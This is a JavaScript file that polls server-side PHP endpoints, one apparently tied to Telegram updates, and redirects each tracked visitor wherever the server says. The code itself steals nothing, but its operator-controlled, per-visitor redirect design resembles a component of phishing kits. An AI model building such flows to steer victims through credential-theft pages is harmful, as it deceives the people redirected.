/**
 * Enhanced Redirect Checker
 * Provides smooth and instant redirection by efficiently checking Telegram updates
 * and JSON status files in parallel.
 */

class RedirectChecker {
    constructor(visitorId, checkInterval, timeout) {
        this.visitorId = visitorId;
        this.checkInterval = checkInterval;
        this.timeout = timeout * 1000;
        this.startTime = Date.now();
        this.isChecking = false;
        this.checkCount = 0;
    }

    /**
     * Start the redirect checking process
     */
    start() {
        console.log('Starting redirect checks for visitor:', this.visitorId);
        this.checkRedirect();
    }

    /**
     * Check for redirects using parallel requests
     */
    checkRedirect() {
        // Prevent multiple simultaneous checks
        if (this.isChecking) {
            return;
        }
        
        this.isChecking = true;
        this.checkCount++;

        // Check if timeout has been reached
        if (Date.now() - this.startTime >= this.timeout) {
            console.log('Timeout reached, redirecting to error page');
            window.location.href = 'error.php?id=' + this.visitorId;
            return;
        }

        // Use Promise.all to run both requests in parallel
        Promise.all([
            // Check Telegram updates
            fetch('check_telegram_updates.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ visitor_id: this.visitorId })
            })
            .then(response => response.json())
            .catch(error => {
                console.warn('Telegram update check error:', error);
                return { status: 'error' };
            }),
            
            // Check JSON status
            fetch('check_json_status.php?visitor_id=' + this.visitorId)
            .then(response => response.json())
            .catch(error => {
                console.warn('JSON status check error:', error);
                return { redirect: false };
            })
        ])
        .then(([telegramResult, jsonResult]) => {
            console.log(`Check #${this.checkCount} - Telegram:`, telegramResult, 'JSON:', jsonResult);
            
            if (jsonResult.redirect) {
                console.log('Redirecting to:', jsonResult.redirect_url);
                window.location.href = jsonResult.redirect_url;
            } else {
                this.isChecking = false;
                setTimeout(() => this.checkRedirect(), this.checkInterval);
            }
        })
        .catch(error => {
            console.error('Error in redirect check:', error);
            this.isChecking = false;
            setTimeout(() => this.checkRedirect(), this.checkInterval);
        });
    }
}

// Initialize and start the redirect checker when the page loads
document.addEventListener('DOMContentLoaded', () => {
    const checkInterval = CHECK_INTERVAL; // This should be defined in your PHP output
    const timeout = TIMEOUT; // This should be defined in your PHP output
    const visitorId = VISITOR_ID; // This should be defined in your PHP output
    
    const redirectChecker = new RedirectChecker(visitorId, checkInterval, timeout);
    redirectChecker.start();
});
